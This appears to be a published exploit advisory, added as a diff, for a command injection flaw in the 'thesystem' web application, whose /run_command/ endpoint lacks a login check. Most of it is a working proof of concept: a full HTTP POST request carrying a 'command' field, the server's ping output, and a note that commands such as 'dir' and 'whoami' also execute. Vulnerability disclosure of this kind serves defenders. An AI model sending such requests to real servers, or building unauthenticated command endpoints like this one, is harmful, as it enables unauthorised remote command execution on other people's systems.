@@ -1,0 +1,52 @@
+# Exploit Title: thesystem Command Injection 
+# Author: Sadik Cetin 
+# Discovery Date: 2019-09-28 
+# Vendor Homepage: [ https://github.com/kostasmitroglou/thesystem | https://github.com/kostasmitroglou/thesystem ] 
+# Software Link: [ https://github.com/kostasmitroglou/thesystem | https://github.com/kostasmitroglou/thesystem ] 
+# Tested Version: 1.0 
+# Tested on OS: Windows 10 
+# CVE: N/A 
+# Type: Webapps 
+# Description: 
+# Simple Command injection after login bypass(login_required didn't used) 
+
+POST /run_command/ HTTP/1.1 
+Host: 127.0.0.1:8000 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 
+Accept-Encoding: gzip, deflate 
+Content-Type: multipart/form-data; boundary=---------------------------168279961491 
+Content-Length: 325 
+Connection: close 
+Referer: [ http://127.0.0.1:8000/run_command/ | http://127.0.0.1:8000/run_command/ ] 
+Cookie: csrftoken=Mss47G2ILybbQoFYXpVPlWNaUzGQ5yKoXGRPucrKIG4gz5X9TVEPQJtItbqN9SM6; _ga=GA1.1.567905900.1569231977; _gid=GA1.1.882048829.1569577719 
+Upgrade-Insecure-Requests: 1 
+-----------------------------168279961491 
+Content-Disposition: form-data; name="csrfmiddlewaretoken" 
+7rigJnIFAByKlmo6NBD7R8Ua66daVjdfiFH16T7HxJrP43GhJ7m7mVAIFIX7ZDfX 
+-----------------------------168279961491 
+Content-Disposition: form-data; name="command" 
+ping 127.0.0.1 
+-----------------------------168279961491-- 
+
+HTTP/1.1 200 OK 
+Date: Sat, 28 Sep 2019 09:42:26 GMT 
+Server: WSGIServer/0.2 CPython/3.5.3 
+Content-Length: 429 
+Content-Type: text/html; charset=utf-8 
+X-Frame-Options: SAMEORIGIN 
+
+Pinging 127.0.0.1 with 32 bytes of data: 
+Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 
+Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 
+Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 
+Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 
+Ping statistics for 127.0.0.1: 
+Packets: Sent = 4, Received = 4, Lost = 0 (0% loss), 
+Approximate round trip times in milli-seconds: 
+Minimum = 0ms, Maximum = 0ms, Average = 0ms 
+
+When I try to run following command, all commands run: 
+dir 
+whoami
